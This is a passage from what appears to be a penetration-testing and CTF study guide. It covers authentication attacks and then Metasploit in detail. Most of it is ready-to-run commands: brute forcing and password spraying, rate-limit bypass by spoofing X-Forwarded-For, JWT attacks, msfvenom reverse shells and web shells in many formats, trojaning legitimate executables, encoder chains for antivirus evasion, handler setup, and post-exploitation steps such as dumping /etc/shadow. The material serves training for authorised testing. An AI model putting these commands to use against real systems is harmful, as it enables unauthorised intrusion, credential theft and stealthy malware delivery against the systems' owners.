
# Username enumeration
for user in admin root user test; do
    curl -X POST http://target.com/login \
      -d "username=$user&password=wrongpass" \
      -v 2>&1 | grep -i "invalid\|incorrect\|not found"
done
```

**Phase 3: MFA Testing**

```bash
# Enable MFA on test account
# Test bypass techniques:

# 1. Direct access after first factor
# 2. Status manipulation
# 3. OTP brute force
# 4. Backup code weakness
# 5. Account recovery bypass
# 6. OAuth bypass
# 7. API endpoint bypass

# Document all findings
```

**Phase 4: Session Management Testing**

```bash
# Session token analysis
# Collect 10+ tokens
for i in {1..10}; do
    curl -X POST http://target.com/login \
      -d "username=user$i&password=pass$i" \
      -c cookies_$i.txt
done

# Analyze tokens
grep "session" cookies_*.txt | cut -d$'\t' -f7 > tokens.txt

# Test session fixation
# Test session timeout
# Test concurrent sessions
# Test session invalidation on logout
```

**Phase 5: Token Vulnerability Testing**

```bash
# For JWT tokens:
python3 jwt_tool.py <JWT_TOKEN> -M at  # All tests mode

# Test none algorithm
# Test weak secret
# Test algorithm confusion
# Test kid injection
# Test claim manipulation

# For API tokens:
# Test token predictability
# Test token revocation
# Test token expiration
# Test scope validation
```

**Phase 6: Brute Force and Rate Limiting**

```bash
# Test account lockout
for i in {1..50}; do
    echo "Attempt $i"
    curl -X POST http://target.com/login \
      -d "username=admin&password=wrong$i" \
      | grep -i "lock\|attempt\|block"
done

# Test rate limiting bypass
# X-Forwarded-For rotation
for i in {1..100}; do
    curl -X POST http://target.com/login \
      -H "X-Forwarded-For: 192.168.1.$i" \
      -d "username=admin&password=test$i"
done

# Distributed brute force
# Use multiple IPs or proxies
```

**Phase 7: Advanced Testing with Burp Suite**

```bash
# Burp Suite Pro methodology:

# 1. Spider/crawl authentication flows
# 2. Use Burp Scanner for automated checks
# 3. Manual testing in Repeater:
#    - Session token manipulation
#    - JWT modification
#    - MFA bypass attempts
# 4. Intruder for brute forcing:
#    - Passwords
#    - OTP codes
#    - Session tokens
# 5. Sequencer for token entropy analysis
# 6. Collaborator for out-of-band testing
```

**Phase 8: OAuth/SAML Testing**

```bash
# OAuth testing
# Test authorization code flow
# Test implicit flow
# Test redirect_uri validation
# Test state parameter
# Test scope validation

# SAML testing
# Test XML signature verification
# Test assertion replay
# Test assertion modification
# Test XXE in SAML requests
```

### Authentication Testing Tools Suite

**Comprehensive Credential Testing:**

```bash
# Spray-ng - Password spraying tool
spray-ng -h target.com -u usernames.txt -p 'Password123!' -d 5

# Patator - Multi-protocol brute forcer
patator http_fuzz url=http://target.com/login method=POST body='username=admin&password=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid'

# CrackMapExec - Windows authentication testing
crackmapexec smb target.com -u users.txt -p passwords.txt

# Kerbrute - Kerberos authentication testing
kerbrute passwordspray -d domain.local --dc 192.168.1.100 users.txt 'Password123!'
```

**Token Analysis Tools:**

```bash
# jwt_tool - JWT testing
jwt_tool <JWT_TOKEN> -M at

# PyJWT - JWT manipulation
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, 'secret', algorithm='HS256'))"

# c-jwt-cracker - JWT secret brute forcing
./jwtcrack <JWT_TOKEN>
```

**Session Testing Tools:**

```bash
# Burp Sequencer - Token entropy analysis
# Use Burp Suite Pro for comprehensive session token analysis

# Custom session analyzer
cat > analyze_sessions.py <<'EOF'
#!/usr/bin/env python3
import requests
import statistics

tokens = []
for i in range(100):
    r = requests.post('http://target.com/login', data={'user':f'test{i}','pass':'pass'})
    token = r.cookies.get('session')
    if token:
        tokens.append(token)

print(f"Total tokens: {len(tokens)}")
print(f"Unique tokens: {len(set(tokens))}")
print(f"Average length: {statistics.mean([len(t) for t in tokens])}")
EOF

python3 analyze_sessions.py
```

### Critical Authentication Vulnerabilities Checklist

```bash
# High-risk findings:
☐ Default credentials accepted
☐ No password policy enforcement
☐ Username enumeration possible
☐ No account lockout mechanism
☐ MFA can be bypassed
☐ Session tokens predictable
☐ Session fixation vulnerability
☐ Sessions not invalidated on logout
☐ JWT with 'none' algorithm accepted
☐ JWT signed with weak secret
☐ CSRF protection missing
☐ Tokens transmitted over HTTP
☐ Tokens stored insecurely (localStorage)
☐ Password reset tokens predictable
☐ OAuth redirect_uri not validated
☐ API endpoints bypass authentication

# Medium-risk findings:
☐ Weak password policy
☐ Long session timeout
☐ Multiple concurrent sessions allowed
☐ No rate limiting on authentication
☐ Tokens in URL parameters
☐ Verbose error messages
☐ No HTTPS enforcement
☐ Missing Secure/HttpOnly flags on cookies

# Documentation template:
# Vulnerability: [Name]
# Risk: [Critical/High/Medium/Low]
# Description: [Details]
# Reproduction Steps: [Step-by-step]
# Proof of Concept: [Commands/screenshots]
# Remediation: [Recommendations]
```

### Important Related Topics

For complete authentication security testing proficiency, study:

- **Biometric Authentication Bypass** - Fingerprint/facial recognition vulnerabilities
- **Certificate-Based Authentication** - Client certificate validation flaws
- **Single Sign-On (SSO) Vulnerabilities** - SAML assertion attacks, OAuth flows
- **Passwordless Authentication** - WebAuthn, FIDO2 security testing
- **Account Takeover Techniques** - Combining multiple weaknesses for full compromise
- **Privilege Escalation via Authentication** - Horizontal and vertical privilege escalation
- **API Authentication Mechanisms** - API key management, OAuth 2.0 flows, OpenID Connect

---

# EXPLOITATION FRAMEWORKS & TOOLS

## Metasploit Framework (MSF)

### msfconsole Basics

**Starting msfconsole:**

```bash
msfconsole
msfconsole -q  # Quiet mode (no banner)
msfconsole -r script.rc  # Run resource script
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp"  # Execute commands
```

**Database initialization:**

```bash
# Initialize database
msfdb init

# Check database status
msfdb status

# Start database
msfdb start

# Connect to database
msfconsole
db_status

# Rebuild cache
msfdb reinit
```

**Basic navigation commands:**

```bash
help                    # Show help menu
help <command>          # Help for specific command
?                       # Alias for help
version                 # Show MSF version
banner                  # Display banner
exit                    # Exit msfconsole
quit                    # Alias for exit
back                    # Move back from current module
```

**Workspace management:**

```bash
workspace                    # List workspaces
workspace -a <name>          # Add workspace
workspace <name>             # Switch to workspace
workspace -d <name>          # Delete workspace
workspace -D                 # Delete all workspaces
workspace -r old_name new_name  # Rename workspace
```

**Information gathering commands:**

```bash
db_nmap <args>          # Run nmap and save to database
hosts                   # List discovered hosts
hosts -a <ip>           # Add host manually
services                # List discovered services
services -p 445         # Filter by port
vulns                   # List discovered vulnerabilities
loot                    # Show collected loot
creds                   # Show collected credentials
notes                   # Show notes
```

**Console features:**

```bash
# Tab completion
use exploit/windows/smb/ms17_<TAB>

# Command history
history
history -c              # Clear history

# Save command output
spool /path/to/file     # Start logging
spool off               # Stop logging

# Execute system commands
!<command>
! ls -la
! whoami

# Background jobs
jobs                    # List active jobs
jobs -k <id>            # Kill job
jobs -K                 # Kill all jobs
```

**Session management:**

```bash
sessions                # List active sessions
sessions -i <id>        # Interact with session
sessions -l             # List sessions (verbose)
sessions -k <id>        # Kill session
sessions -K             # Kill all sessions
sessions -u <id>        # Upgrade shell to meterpreter
sessions -c <cmd> <id>  # Execute command on session
sessions -s <script>    # Run script on all sessions
```

**Global options:**

```bash
setg <option> <value>   # Set global option
unsetg <option>         # Unset global option
getg <option>           # Get global option value
save                    # Save global settings

# Common global options
setg LHOST 192.168.1.100
setg LPORT 4444
setg RHOSTS target_ip
```

**Resource scripts:**

```bash
# Create resource script
echo "use exploit/multi/handler" > handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.100" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Load resource script
resource handler.rc

# Makerc - record commands
makerc /path/to/script.rc
```

**Logging and output:**

```bash
spool /tmp/msf_output.log    # Start logging
spool off                     # Stop logging

# Color output
color true
color false
```

### Module Types

Metasploit modules are organized into distinct categories based on their functionality.

**Exploit modules** (`exploit/`): Active exploitation modules that leverage vulnerabilities to gain access.

Structure:

```
exploit/<platform>/<service>/<vulnerability>
```

Examples:

```bash
exploit/windows/smb/ms17_010_eternalblue
exploit/linux/http/apache_mod_cgi_bash_env_exec
exploit/multi/handler
exploit/unix/ftp/vsftpd_234_backdoor
```

Common platforms:

- `windows/` - Windows exploits
- `linux/` - Linux exploits
- `unix/` - Unix-like systems
- `multi/` - Multi-platform exploits
- `android/` - Android exploits
- `osx/` - macOS exploits

**Payload modules** (`payload/`): Code executed on target after successful exploitation.

Types of payloads:

Singles:

```
payload/windows/shell_reverse_tcp
payload/linux/x86/exec
payload/cmd/unix/reverse
```

Stagers (small, stage larger payload):

```
payload/windows/meterpreter/reverse_tcp
payload/linux/x64/meterpreter/reverse_tcp
payload/windows/shell/reverse_tcp
```

Stages (second stage loaded by stager):

```
payload/windows/meterpreter
payload/linux/meterpreter
```

**Auxiliary modules** (`auxiliary/`): Non-exploit modules for scanning, fuzzing, and information gathering.

Categories:

```bash
# Scanners
auxiliary/scanner/smb/smb_version
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/portscan/tcp

# DoS
auxiliary/dos/tcp/synflood

# Servers
auxiliary/server/capture/http_basic

# Fuzzers
auxiliary/fuzzers/http/http_form_field

# Admin tools
auxiliary/admin/mysql/mysql_sql
auxiliary/admin/smb/upload_file
```

Examples:

```bash
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/gather/shodan_search
use auxiliary/admin/mssql/mssql_exec
```

**Post-exploitation modules** (`post/`): Modules executed after gaining access to perform specific tasks.

Categories:

```bash
# Gather information
post/windows/gather/credentials/credential_collector
post/linux/gather/enum_system
post/multi/gather/firefox_creds

# Escalate privileges
post/windows/escalate/getsystem
post/linux/escalate/cve2021_4034_pwnkit

# Maintain access
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Lateral movement
post/windows/gather/enum_domain
post/windows/gather/enum_shares
```

Examples:

```bash
use post/windows/gather/hashdump
use post/linux/gather/enum_configs
use post/multi/recon/local_exploit_suggester
use post/windows/manage/enable_rdp
```

**Encoder modules** (`encoder/`): Encode payloads to evade detection and bypass bad characters.

Examples:

```bash
encoder/x86/shikata_ga_nai       # Polymorphic XOR encoder
encoder/x64/xor_dynamic          # Dynamic XOR encoder
encoder/cmd/powershell_base64    # PowerShell Base64 encoder
encoder/x86/alpha_mixed          # Alphanumeric encoder
```

Usage:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10
```

**Evasion modules** (`evasion/`): Generate payloads designed to evade AV/EDR detection.

Examples:

```bash
evasion/windows/windows_defender_exe
evasion/windows/applocker_evasion_install_util
evasion/windows/syscall_inject
```

**NOP modules** (`nop/`): No-operation generators for exploit padding.

Examples:

```bash
nop/x86/single_byte
nop/x64/simple
```

### Search and Selection

**Basic search:**

```bash
search <term>
search ms17-010
search type:exploit platform:windows smb
search apache
```

**Search filters:**

```bash
# By type
search type:exploit
search type:auxiliary
search type:post
search type:payload

# By platform
search platform:windows
search platform:linux
search platform:unix

# By name
search name:smb
search name:apache

# By CVE
search cve:2017
search cve:2021-44228

# By rank
search rank:excellent
search rank:great

# By date
search date:2021

# Multiple filters
search type:exploit platform:windows smb rank:excellent
search cve:2017 type:exploit platform:linux
```

**Search operators:**

```bash
# Combine terms
search smb ms17

# Exclude terms
search apache -tomcat

# Exact phrase (in module description)
search "remote code execution"
```

**Common search examples:**

```bash
search eternalblue
search shellshock
search log4j
search struts
search tomcat
search wordpress
search drupal
search joomla
```

**Using modules:**

```bash
# Select module
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_version

# With search index
search smb ms17
use 0              # Use first result

# Back to previous context
back
```

**Module information:**

```bash
# Show module options
show options
show advanced
show evasion

# Show compatible payloads
show payloads
show payloads -p linux

# Show targets
show targets

# Show encoders
show encoders

# Show module info
info
info exploit/windows/smb/ms17_010_eternalblue

# Check module
check              # Test if target is vulnerable
```

**Setting options:**

```bash
# Basic syntax
set <OPTION> <value>
set RHOSTS 192.168.1.100
set RHOST 10.10.10.10
set LHOST 192.168.1.50
set LPORT 4444

# Multiple hosts
set RHOSTS 192.168.1.1-254
set RHOSTS 192.168.1.0/24
set RHOSTS file:/path/to/targets.txt

# Unset option
unset RHOSTS
unset PAYLOAD

# View current settings
get LHOST
show options
```

**Required vs optional options:**

```bash
show options

# Output shows:
# Required: yes/no
# Current Setting: value
# Description: what it does
```

**Advanced options:**

```bash
show advanced

# Common advanced options
set VERBOSE true
set ConnectTimeout 10
set Proxies socks4:127.0.0.1:9050
set CPORT 8080             # Source port
set CHOST 192.168.1.1      # Source IP
```

**Target selection:**

```bash
show targets
set TARGET <index>
set TARGET 0               # Windows 7 SP1 x64

# Auto-select target
set TARGET automatic
```

**Payload selection:**

```bash
# Show compatible payloads
show payloads

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp
set PAYLOAD cmd/unix/reverse_python

# Payload-specific options
show options              # Shows payload options like LHOST, LPORT
```

**Module execution:**

```bash
# Run exploit
exploit
run                       # Alias for exploit

# Run as background job
exploit -j
run -j

# Check without exploiting
check

# Run with specific payload
exploit -p windows/shell/reverse_tcp

# Run against specific target
exploit -t 2
```

### Payload Generation and Customization

**msfvenom basics:**

msfvenom combines msfpayload and msfencode into a single tool.

Basic syntax:

```bash
msfvenom -p <payload> -f <format> -o <output_file> [options]
```

**List available payloads:**

```bash
msfvenom --list payloads
msfvenom --list payloads | grep windows
msfvenom --list payloads | grep meterpreter
msfvenom --list payloads | grep reverse_tcp
```

**List formats:**

```bash
msfvenom --list formats

# Common formats:
# Executable: exe, elf, macho
# Transform: c, python, ruby, powershell, bash
# Raw: raw, hex, base64
```

**List encoders:**

```bash
msfvenom --list encoders
```

**List platforms:**

```bash
msfvenom --list platforms
```

**List architectures:**

```bash
msfvenom --list archs
```

**Basic payload generation:**

Windows reverse TCP shell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

Linux reverse TCP shell:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

Windows Meterpreter:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o meter.exe
```

**Architecture-specific payloads:**

```bash
# x86 (32-bit)
msfvenom -p windows/shell_reverse_tcp -a x86 -f exe -o shell_x86.exe

# x64 (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe -o shell_x64.exe

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell64.elf
```

**Platform-specific payloads:**

Windows:

```bash
# Staged payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o staged.exe

# Stageless payload
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o stageless.exe

# DLL
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o shell.dll

# Service executable
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe-service -o service.exe

# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o shell.ps1

# VBA (for Office macros)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba -o macro.vba

# MSI installer
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o installer.msi
```

Linux:

```bash
# ELF binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# Bash script
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.sh

# Python script
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py
```

Web payloads:

```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
```

**Encoding payloads:**

Single encoding:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe
```

Multiple iterations:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded10x.exe
```

Multiple encoders (chain):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -e x86/fnstenv_mov -e x86/jmp_call_additive -i 3 -f exe -o multi_encoded.exe
```

**Payload customization:**

Add NOP sled:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -n 200 -f exe -o nop_shell.exe
```

Specify bad characters:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o nobadchars.exe
```

Smallest payload size:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 --smallest -f exe -o smallest.exe
```

**Template injection:**

Inject into legitimate executable:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/legitimate.exe -f exe -o trojaned.exe

# Keep template functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/legitimate.exe -k -f exe -o trojaned_keep.exe
```

**Shellcode formats:**

C language:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Output: unsigned char buf[] = "\xfc\xe8\x82..."
```

Python:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python
# Output: buf = b"\x6a\x0a\x5e..."
```

PowerShell:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh
```

Bash:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw
```

Raw hex:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex
```

Base64:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw | base64
```

**Multi-handler setup:**

Start listener for generated payload:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
```

Resource script for handler:

```bash
# handler.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Load it
msfconsole -r handler.rc
```

**Payload options:**

Connection types:

```bash
# Reverse (victim connects to attacker)
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_http
windows/meterpreter/reverse_https

# Bind (attacker connects to victim)
windows/meterpreter/bind_tcp

# Find port (tries multiple ports)
windows/meterpreter/find_tag
```

Advanced payload options:

```bash
# HTTP/HTTPS payloads
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 HttpUserAgent="Mozilla/5.0" -f exe -o https_meter.exe

# Custom exit function
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f exe -o thread_exit.exe

# Proxy-aware payload
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=8080 HttpProxyHost=proxy.company.com HttpProxyPort=3128 -f exe -o proxy_meter.exe
```

**Staged vs stageless:**

Staged (smaller initial size):

```bash
# Stager/stage separated by /
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o staged.exe
```

Stageless (larger, but no second connection):

```bash
# Note underscore instead of slash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o stageless.exe
```

**Payload generation best practices:**

Check payload size:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 --list-options
```

Verbose output:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe --verbose -o shell.exe
```

Test payload locally:

```bash
# Generate test payload
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o test.exe

# Start handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell_reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; exploit"

# Execute test.exe in VM
```

**Common CTF payload scenarios:**

Reverse shell for Linux box:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell

# Make executable
chmod +x shell

# Start handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"
```

Web shell for PHP application:

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Handler
use exploit/multi/handler
set PAYLOAD php/meterpreter_reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit
```

Windows executable with evasion:

```bash
msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.1.100 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o evasive.exe
```

### Exploit Execution and Session Handling

Metasploit Framework provides integrated exploit development, delivery, and post-exploitation capabilities. The modular architecture supports rapid exploitation during CTF scenarios.

Launch msfconsole:

```bash
msfconsole
```

Interactive console provides command-line access to exploits, payloads, and auxiliary modules. Search for exploits:

```
msf > search apache 2.4.41
```

Results display module paths, descriptions, and disclosure dates. Select exploit module:

```
msf > use exploit/unix/webapp/apache_mod_alias_rce
```

The `use` command loads the selected module. Display module information:

```
msf > info
```

Output includes description, affected software versions, CVSS score, required options, and payload compatibility.

Configure exploitation parameters:

```
msf > set RHOSTS 192.168.1.100
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > set PAYLOAD php/reverse_tcp
```

Parameters: RHOSTS (target), LHOST (attacker callback IP), LPORT (attacker callback port), PAYLOAD (post-exploitation code). View configured options:

```
msf > options
```

Displays all module parameters with current values and requirements (required parameters marked `yes`). Execute exploitation:

```
msf > exploit
```

Alternative syntax:

```
msf > run
```

Upon successful exploitation, a session is established and control passes to the session handler.

**Session Management:**

List active sessions:

```
msf > sessions
```

Output displays session ID, session type (shell, meterpreter), and target information. Interact with session:

```
msf > sessions -i 1
```

The `-i` parameter specifies session ID. Interactive shell commands execute on target system. Background session:

```
meterpreter > background
```

Returns to msfconsole while maintaining session. Resume session:

```
msf > sessions -i 1
```

Kill session:

```
msf > sessions -k 1
```

Execute command on session without interaction:

```
msf > sessions -c "whoami" -i 1
```

The `-c` parameter specifies command. Execute command on all sessions:

```
msf > sessions -c "ifconfig" -C
```

The `-C` flag executes command across all active sessions.

**Meterpreter Sessions:**

Meterpreter provides advanced post-exploitation functionality. Core commands:

```
meterpreter > help
```

Lists all available commands. Common meterpreter operations:

```
meterpreter > getuid
meterpreter > getpid
meterpreter > sysinfo
```

Retrieve current user, process ID, and system information respectively. Execute system commands:

```
meterpreter > shell
```

Drops to system shell. Exit with `exit`. File system operations:

```
meterpreter > ls
meterpreter > pwd
meterpreter > cd /tmp
meterpreter > cat /etc/passwd
```

Upload files to target:

```
meterpreter > upload /tmp/payload.sh /tmp/
```

Download files from target:

```
meterpreter > download /etc/shadow /tmp/shadow.txt
```

Privilege escalation through meterpreter:

```
meterpreter > getsystem
```

Attempts multiple privilege escalation techniques. [Unverified] Success depends on Windows-specific vulnerabilities and process permissions; not guaranteed across all systems.

### Multi/Handler for Reverse Shells

**Multi-handler** is the listener component receiving reverse shell connections. Configure handler to catch callbacks from exploited targets.

Basic multi-handler setup:

```bash
msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"
```

This command-line approach automates handler initialization. Alternatively, in interactive msfconsole:

```
msf > use multi/handler
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > exploit
```

Handler waits for incoming connections. Upon connection, a meterpreter session is established.

**Multiple Handler Instances:**

Simultaneously handle multiple payload types or ports. Open multiple terminals:

```bash
# Terminal 1: Windows reverse shell handler
msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit"

# Terminal 2: Linux reverse shell handler
msfconsole -x "use multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4445; exploit"

# Terminal 3: Web shell handler
msfconsole -x "use multi/handler; set PAYLOAD php/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4446; exploit"
```

This configuration handles multiple reverse shells on different ports. Session management remains unified in msfconsole.

**Handler Persistence:**

Configure ExitOnSession to prevent handler termination after session establishment:

```
msf > use multi/handler
msf > set ExitOnSession false
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > exploit
```

Handler continues listening after receiving connections, enabling multiple callbacks. Monitor incoming connections:

```
msf > sessions -l
```

Lists all established sessions. Accept additional connections without restarting handler.

### Staged vs Unstaged Payloads

Payload architecture affects delivery size, execution flow, and reliability.

**Staged Payloads:**

Staged payloads employ two-stage delivery: stage 0 (small stager) downloads and executes stage 1 (full payload). Reduces initial footprint.

Syntax includes forward slash indicating staged format:

```
windows/meterpreter/reverse_tcp
```

Stage 0 (stager) is minimal code establishing callback and downloading stage 1. [Inference] Smaller initial size reduces detection probability but requires network callback before full payload execution.

Generate staged payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_staged.exe
```

Payload size for staged variant typically 2-5 KB. Generate unstaged equivalent to compare:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_unstaged.exe
```

Underscore indicates unstaged format. File size typically 50-100 KB.

**Unstaged Payloads:**

Unstaged payloads deliver entire shellcode in single transmission. Larger but more reliable for unreliable networks or limited callback capabilities.

No network dependency after initial delivery. [Inference] Larger size increases detection risk but eliminates vulnerability window between stage 0 and stage 1 delivery.

Metasploit naming convention for unstaged payloads uses underscore:

```
windows/meterpreter_reverse_tcp (unstaged)
windows/meterpreter/reverse_tcp (staged)
```

**Operational Considerations:**

Staged payloads advantageous when:

- Initial delivery mechanisms have size limitations (HTTP parameter, buffer overflow)
- Network bandwidth is limited
- Antivirus scanning targets large files

Unstaged payloads advantageous when:

- Network connectivity unreliable or frequently interrupted
- Firewall restricts secondary callbacks
- Detection surface smaller than staged overhead

Configure msfconsole for staged payload generation:

```
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > generate -f exe -o payload.exe
```

Configure for unstaged:

```
msf > set PAYLOAD windows/meterpreter_reverse_tcp
msf > generate -f exe -o payload.exe
```

**Payload Compatibility:**

Not all operations support both staged and unstaged variants. Query available payloads:

```bash
msfvenom -l payloads | grep "windows/meterpreter"
```

This lists all Windows meterpreter payload variations. Test specific payload staging:

```bash
msfvenom -p windows/shell_reverse_tcp --list-options | grep -i "stage"
```

### Encoder Chains for AV Evasion

Encoder chains obfuscate payload code to evade antivirus detection. Metasploit integrates multiple encoders enabling sequential transformation.

Basic single-encoder approach:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload_encoded.exe
```

The `-e` parameter specifies encoder. Shikata_ga_nai is a polymorphic encoder generating unique bytecode each execution. [Inference] Polymorphic encoders create different encoded variants for identical payloads, complicating signature-based detection.

**Encoder chain specification:**

Single encoder iteration may not evade detection. Chain multiple encoders:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe
```

The `-i` parameter specifies iteration count. This applies shikata_ga_nai five times sequentially. Each iteration adds additional obfuscation layers.

Alternative encoder chaining:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/fnstenv_mov -e x86/shikata_ga_nai -f exe -o payload_chained.exe
```

Multiple `-e` parameters chain different encoders. First fnstenv_mov executes, then shikata_ga_nai processes the result.

List available encoders:

```bash
msfvenom -l encoders
```

Output displays encoder names, architecture support, and descriptions. Platform-specific encoders:

- x86 (32-bit Intel)
- x64 (64-bit Intel)
- arm (ARM processors)

**Encoder Selection for Target Architecture:**

x86 encoders for 32-bit systems:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/jmp_call_additive -f exe -o payload_x86.exe
```

x64 encoders for 64-bit systems:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x64/xor -f exe -o payload_x64.exe
```

**Encoding within msfconsole:**

Generate payload through msfconsole interface:

```
msf > use payload/windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > generate -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
```

